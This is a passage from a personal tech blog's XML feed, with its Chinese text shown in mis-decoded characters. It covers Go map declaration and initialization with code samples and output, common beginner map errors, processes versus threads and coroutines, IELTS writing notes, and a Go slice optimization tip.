æè¿°</h2><p>è¿™é‡Œé‡ç‚¹å¯¹å…¨å±€mapå˜é‡å’Œå±€éƒ¨å˜é‡å±•å¼€è¯´æ˜ï¼Œåˆ†ä¸‰ç§æƒ…å†µ</p><p><strong>ä¸€ã€å…¨å±€å£°æ˜å¹¶åˆå§‹åŒ–</strong><br>å‡½æ•°ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨mapå˜é‡</p><p>ä»¥ä¸Šè¾“å‡ºç»“æœ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API server listening at: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">18268</span></span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>] <span class="number">100</span></span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">400</span>] <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">500</span>] <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼š<br>0ã€Golangå˜é‡å£°æ˜çš„æ—¶å€™ä¸èƒ½çœç•¥ç±»å‹ï¼Œä½†æ˜¯å£°æ˜å¹¶èµ‹å€¼çš„æ—¶å€™å¯ä»¥çœç•¥ç±»å‹ï¼Œè‡ªåŠ¨æ¨å¯¼ã€‚mapåŒæ ·é€‚ç”¨ï¼Œæ‰€ä»¥ä»¥ä¸‹ä¸¤ç§å†™æ³•ç­‰ä»·</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><p>1ã€Golangå’ŒCä¸€æ ·ï¼Œæ‰€æœ‰çš„è¿ç®—éƒ½åº”è¯¥åœ¨å‡½æ•°å†…è¿›è¡Œï¼Œå‡½æ•°å¤–è¿›è¡ŒæŠ¥è¯­æ³•é”™è¯¯ã€‚<br>1.0 å‡½æ•°ä½“å¤–åˆå§‹åŒ–å˜é‡å°±ä¸¤ä¸ªåŠæ³•ï¼Œè¦ä¹ˆä¸€æ¬¡æ€§å…¨éƒ¨èµ‹å€¼ï¼Œè¦ä¹ˆå…ˆå£°æ˜ï¼ˆå…¨å±€/å±€éƒ¨ï¼‰å˜é‡ï¼Œåœ¨æŸä¸ªå‡½æ•°å†…è¿›è¡Œèµ‹å€¼ï¼Œåœ¨å‡½æ•°ä½“å¤–è¿›è¡Œç»“æ„ä½“æˆå‘˜èµ‹å€¼ç›¸å½“äºå‡½æ•°å¤–é¢è¿›è¡Œè¿ç®—äº†<br>1.1 æ‰€ä»¥:=åªèƒ½åœ¨å‡½æ•°ä¸­ä½¿ç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(m)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šé”™è¯¯ä»£ç ï¼Œç¼–è¯‘æŠ¥é”™ï¼šsyntax error: non-declaration statement outside function body<br><strong>äºŒã€å…¨å±€å£°æ˜ã€å±€éƒ¨åˆå§‹åŒ–</strong><br>å±€éƒ¨å¿…é¡»åˆå§‹åŒ–æ‰èƒ½ä½¿ç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> m3 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> m4 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(m3)</span><br><span class="line">    <span class="comment">// ç›´æ¥ä½¿ç”¨ä¼šå‡ºç°panic</span></span><br><span class="line">    <span class="comment">// m3[3] = 300</span></span><br><span class="line">    <span class="comment">// ç¬¬ä¸€ç§æ–¹å¼åˆå§‹åŒ–</span></span><br><span class="line">    m3 = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    m3[<span class="number">3</span>] = <span class="number">300</span></span><br><span class="line">    fmt.Println(m3)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ç¬¬äºŒç§æ–¹å¼åˆå§‹åŒ–</span></span><br><span class="line">    m4 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    m4[<span class="number">4</span>] = <span class="number">400</span></span><br><span class="line">    fmt.Println(m4)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šè¾“å‡ºç»“æœ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API server listening at: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">49253</span></span><br><span class="line"><span class="keyword">map</span>[]</span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>]</span><br><span class="line"><span class="keyword">map</span>[<span class="number">4</span>:<span class="number">400</span>]</span><br></pre></td></tr></table></figure><p><strong>ä¸‰ã€å±€éƒ¨å£°æ˜å’Œåˆå§‹åŒ–</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€ç§æ–¹å¼[å¯ä»¥çœç•¥å˜é‡ç±»å‹]</span></span><br><span class="line">    <span class="comment">// var m5 = map[int]int&#123;1: 100, 2: 200&#125;</span></span><br><span class="line">    <span class="keyword">var</span> m5 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    m5[<span class="number">3</span>] = <span class="number">300</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m5 = %v\n&quot;</span>, m5)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ç¬¬äºŒç§æ–¹å¼</span></span><br><span class="line">    <span class="keyword">var</span> m6 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line">    m6 = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    m6[<span class="number">3</span>] = <span class="number">300</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m6 = %v\n&quot;</span>, m6)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ç¬¬ä¸‰ç§æ–¹å¼</span></span><br><span class="line">    <span class="keyword">var</span> m7 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line">    <span class="comment">// å¿…é¡»è¦åˆå§‹åŒ–</span></span><br><span class="line">    m7 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">    m7[<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m7 = %v\n&quot;</span>, m7)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ç¬¬å››ç§æ–¹å¼</span></span><br><span class="line">    m8 := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;m8 = %v\n&quot;</span>, m8)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ç¬¬äº”ç§æ–¹å¼</span></span><br><span class="line">    m9 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    m9[<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m9 = %v\n&quot;</span>, m9)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šè¾“å‡ºç»“æœ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">API server listening at: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">10546</span></span><br><span class="line">m5 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>]</span><br><span class="line">m6 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>]</span><br><span class="line">m7 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span>]</span><br><span class="line">m8 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span>]</span><br><span class="line">m9 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span>]</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äºŒéƒ¨åˆ†-æ€»ç»“"><a href="#ç¬¬äºŒéƒ¨åˆ†-æ€»ç»“" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† æ€»ç»“"></a>ç¬¬äºŒéƒ¨åˆ† æ€»ç»“</h2><p>æ–°æ‰‹å†™mapå¸¸è§é”™è¯¯<br>0ã€map valueç±»å‹è¯¯åŠ æ‹¬å·</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>][<span class="keyword">int</span>]</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æç¤ºï¼šsyntax error: unexpected newline, expecting type<br>æ­£ç¡®å†™æ³•</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>1ã€åˆå§‹åŒ–å†™é”™ã€<strong>æ–°æ‰‹ç‰¹åˆ«å®¹æ˜“å‡ºé”™</strong>ã€‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><p>VSCodeæç¤º: expected â€˜;â€™, found â€˜{â€˜ syntax<br>ç¼–è¯‘æç¤ºï¼šsyntax error: unexpected { after top level declaration<br>æ­£ç¡®å†™æ³•</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><p>2ã€æ ¼å¼åŒ–è¾“å‡ºmapå˜é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;m = %v\n&quot;</span>, m)</span><br><span class="line"><span class="comment">// m = map[1:100 2:200]</span></span><br></pre></td></tr></table></figure><p>3ã€åœ¨å‡½æ•°ä¸­å®šä¹‰ä¸€ä¸ªç©ºmap</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">byte</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="comment">// ç­‰ä»·</span></span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">byte</span>]<span class="keyword">int</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>4ã€å£°æ˜äº†æ²¡æœ‰åˆå§‹åŒ–çš„mapæ˜¯ä¸€ä¸ªå€¼ä¸ºnilçš„mapï¼Œå‘è¿™æ ·çš„mapä¸­å­˜å…¥å…ƒç´ ï¼Œå°†å¯¼è‡´panicå¼‚å¸¸<br>panic: assignment to entry in nil map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">m[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;salmonl&quot;</span></span><br></pre></td></tr></table></figure><p>5ã€ä½¿ç”¨makeåˆå§‹åŒ–mapå¯ä»¥å¿½ç•¥sizeå‚æ•°ï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªè¾ƒå°çš„å‚æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">make</span><span class="params">(t Type, size ...IntegerType)</span> <span class="title">Type</span></span></span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<br><a href="https://segmentfault.com/q/1010000009276425">segfentfault: åˆšå­¦goï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆå†™ä¼šæŠ¥é”™ï¼Ÿ</a><br><a href="https://books.studygolang.com/gopl-zh/ch4/ch4-03.html">Goåœ£ç»Map</a>ã€æ¯”è¾ƒå…¨é¢ã€‘<br><a href="https://pkg.go.dev/builtin#make">Goå®˜æ–¹makeå†…ç½®å‡½æ•°</a><br><a href="http://niliu.me/articles/1590.html">http://niliu.me/articles/1590.html</a></p></blockquote><p><a href="http://niliu.me/articles/1590.html"></a></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›ç¨‹ï¼Œçº¿ç¨‹å’Œåç¨‹çš„åŒºåˆ«</title>
      <link href="/2022/05/06/%E8%BF%9B%E7%A8%8B%EF%BC%8C%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/05/06/%E8%BF%9B%E7%A8%8B%EF%BC%8C%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<ol><li>è¿›ç¨‹æ˜¯åº”ç”¨ç¨‹åºçš„æ‰§è¡Œå‰¯æœ¬ï¼Œæ˜¯åº”ç”¨ç¨‹åºå‘æ“ä½œç³»ç»Ÿç”³è¯·èµ„æºçš„æœ€å°å•ä½ã€‚</li><li>çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿåˆ†é…æ‰§è¡Œç¨‹åºçš„æœ€å°å•ä½ï¼Œè€Œè¿™ä¸ªæ‰§è¡Œç¨‹åºæŒ‡çš„æ˜¯kernel threadï¼Œå®ƒæ‰èƒ½çœŸçš„å»æ‰§è¡Œç¨‹åºï¼Œå¯¹äºåº”ç”¨ç¨‹åºåˆ›å»ºçš„threadå®ƒå’Œkernel thread ä¹‹é—´å­˜åœ¨ç€æ˜ å°„å…³ç³»ï¼Œå¦‚1å¯¹1ï¼Œ1å¯¹å¤šï¼Œnå¯¹mï¼Œä½†æ˜¯çº¿ç¨‹ä¹‹é—´åˆ‡æ¢å¼€é”€éå¸¸å¤§ã€‚</li><li>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†è¿›ä¸€æ­¥æé«˜çº¿ç¨‹åˆ©ç”¨ç‡ï¼Œåœ¨ä¸€ä¸ªé«˜ioï¼Œä»»åŠ¡å¾ˆå°çš„æƒ…å†µä¸‹æˆ‘ä»¬ä¼šåˆ›å»ºå¾ˆå¤šroutineï¼Œè¿™äº›routineå»shareå°‘é‡çš„çº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹å†å»å¯¹åº”kernel threadï¼Œä¹Ÿå°±æ˜¯çº¿ç¨‹çš„åˆ‡æ¢æ˜¯kernelçš„è¡Œä¸ºï¼Œè€Œroutineçš„åˆ‡æ¢æ˜¯ä¸€ä¸ªruntimeçš„è¡Œä¸ºï¼Œå¼€é”€å¾ˆå°ï¼Œæ‰€ä»¥è¯´å½“taskå¾ˆå°çš„æ—¶å€™ç¨‹åºè¯­è¨€å°±éœ€è¦æ”¯æŒroutineï¼Œgoè¯­è¨€çš„åç¨‹å°±æ˜¯routineçš„ä¸€ç§å®ç°ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTSå†™ä½œç¬”è®°-1</title>
      <link href="/2022/04/24/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2022/04/24/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾—åˆ†ç‚¹1ï¼šæ¸…æ™°çš„æ–‡ç« åˆ†æ®µ"><a href="#å¾—åˆ†ç‚¹1ï¼šæ¸…æ™°çš„æ–‡ç« åˆ†æ®µ" class="headerlink" title="å¾—åˆ†ç‚¹1ï¼šæ¸…æ™°çš„æ–‡ç« åˆ†æ®µ"></a>å¾—åˆ†ç‚¹1ï¼šæ¸…æ™°çš„æ–‡ç« åˆ†æ®µ</h2><h3 id="è¾©è®ºæ–‡ä½“"><a href="#è¾©è®ºæ–‡ä½“" class="headerlink" title="è¾©è®ºæ–‡ä½“"></a>è¾©è®ºæ–‡ä½“</h3><p><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/0.png"><br>ç«‹åœºä¸é‡è¦ï¼Œé€‰æ­£åéƒ½å¯ä»¥ï¼Œä½†æ˜¯åˆ«ä¸­ç«‹ã€‚</p><h4 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h4><ol start="3"><li>Scientists believe computers will become more intelligent than human beings. Some people think the development will be negative. To what extent do you agree or disagree?<br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/1.png"><br>çº¢è‰²éƒ¨åˆ†éƒ½æ˜¯æ¡†æ¶<br>ç»“å°¾ä¸éœ€è¦å¤ªåä¸½ï¼Œå±•æœ›ä¸äº†çš„è¯ç‚¹ä¸€ä¸‹ä¸»æ—¨å°±è¡Œã€‚ <h3 id="è®¨è®ºæ–‡ä½“"><a href="#è®¨è®ºæ–‡ä½“" class="headerlink" title="è®¨è®ºæ–‡ä½“"></a>è®¨è®ºæ–‡ä½“</h3><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/2.png"><h4 id="ä¾‹-1"><a href="#ä¾‹-1" class="headerlink" title="ä¾‹"></a>ä¾‹</h4><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/3.png"><br>å›åº”ä¹‹åå†ä¸¾ç‚¹ä¾‹å­ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/4.png"><h3 id="æŠ¥å‘Šæ–‡ä½“"><a href="#æŠ¥å‘Šæ–‡ä½“" class="headerlink" title="æŠ¥å‘Šæ–‡ä½“"></a>æŠ¥å‘Šæ–‡ä½“</h3></li></ol><p><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/5.png"></p><h4 id="ä¾‹-2"><a href="#ä¾‹-2" class="headerlink" title="ä¾‹"></a>ä¾‹</h4><p><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/6.png"></p><h2 id="å¾—åˆ†ç‚¹2ï¼š-æ¸…æ™°çš„è®ºç‚¹å¥"><a href="#å¾—åˆ†ç‚¹2ï¼š-æ¸…æ™°çš„è®ºç‚¹å¥" class="headerlink" title="å¾—åˆ†ç‚¹2ï¼š æ¸…æ™°çš„è®ºç‚¹å¥"></a>å¾—åˆ†ç‚¹2ï¼š æ¸…æ™°çš„è®ºç‚¹å¥</h2><p><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/7.png"></p><h2 id="å¾—åˆ†ç‚¹3ï¼š-æ¸…æ™°çš„è®ºç‚¹å¥è§£é‡Šè¯´æ˜"><a href="#å¾—åˆ†ç‚¹3ï¼š-æ¸…æ™°çš„è®ºç‚¹å¥è§£é‡Šè¯´æ˜" class="headerlink" title="å¾—åˆ†ç‚¹3ï¼š æ¸…æ™°çš„è®ºç‚¹å¥è§£é‡Šè¯´æ˜"></a>å¾—åˆ†ç‚¹3ï¼š æ¸…æ™°çš„è®ºç‚¹å¥è§£é‡Šè¯´æ˜</h2><p><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/8.png"><br>è§£é‡Šæ˜ç™½å°±è¡Œï¼Œè¯æ±‡å…¶å®ä¸é‡è¦ã€‚</p><h4 id="ä¾‹-3"><a href="#ä¾‹-3" class="headerlink" title="ä¾‹"></a>ä¾‹</h4><p><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/9.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/10.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/11.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/12.png"><br>å£è¯­æ‰©å¥åŒæ ·å¯ä»¥ç”¨è¿™ä¸ªæ€è·¯ã€‚<br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/13.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/14.png"><br>for example,find writing samplesâ€¦</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goè¯­è¨€sliceä¼˜åŒ–</title>
      <link href="/2022/04/24/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/"/>
      <url>/2022/04/24/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯¹ä»¥ä¸‹ä»£ç è¿›è¡Œä¼˜åŒ–"><a href="#å¯¹ä»¥ä¸‹ä»£ç è¿›è¡Œä¼˜åŒ–" class="headerlink" title="å¯¹ä»¥ä¸‹ä»£ç è¿›è¡Œä¼˜åŒ–"></a>å¯¹ä»¥ä¸‹ä»£ç è¿›è¡Œä¼˜åŒ–</h2><p><img src="https://snowgo.top/medias/medias/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/3.png"></p><h2 id="ç­”æ¡ˆ"><a href="#ç­”æ¡ˆ" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h2><p>é¦–å…ˆæ—¢ç„¶å·²ç»çŸ¥é“æœ‰å¤šå°‘ä¸ªå…ƒç´ äº†é‚£åˆå§‹åŒ–çš„æ—¶å€™å°±æŠŠcapç»™å‡º<br><img src="https://snowgo.top/medias/medias/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/4.png"><br>è¿›ä¸€æ­¥ä¼˜åŒ–ï¼š<br><img src="https://snowgo.top/medias/medias/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/5.png"><br>ç›´æ¥åˆ†é…ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œè€Œä¸æ˜¯åˆå§‹åŒ–æŒ‡é’ˆï¼Œæ¯•ç«Ÿå®ƒæŒ‡å‘çš„éƒ½æ˜¯ç›¸é‚»çš„å†…å­˜ä½ç½®ï¼Œæ€§èƒ½ä¼šå¥½ä¸€äº›</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµè§ˆå™¨åœ°å€æ è¾“å…¥URLæ•²ä¸‹å›è½¦åå‘ç”Ÿäº†ä»€ä¹ˆ</title>
      <link href="/2022/04/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
      <url>/2022/04/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
      
